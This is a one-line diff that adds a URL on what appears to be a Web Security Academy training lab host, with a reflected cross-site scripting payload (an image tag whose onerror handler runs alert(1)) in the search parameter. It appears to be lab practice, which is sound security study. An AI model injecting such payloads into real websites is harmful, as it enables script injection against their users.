@@ -1,0 +1,1 @@
+https://acae1f691fd1ecfa8036329000920026.web-security-academy.net/?search=<img src=1 onerror=alert(1)>
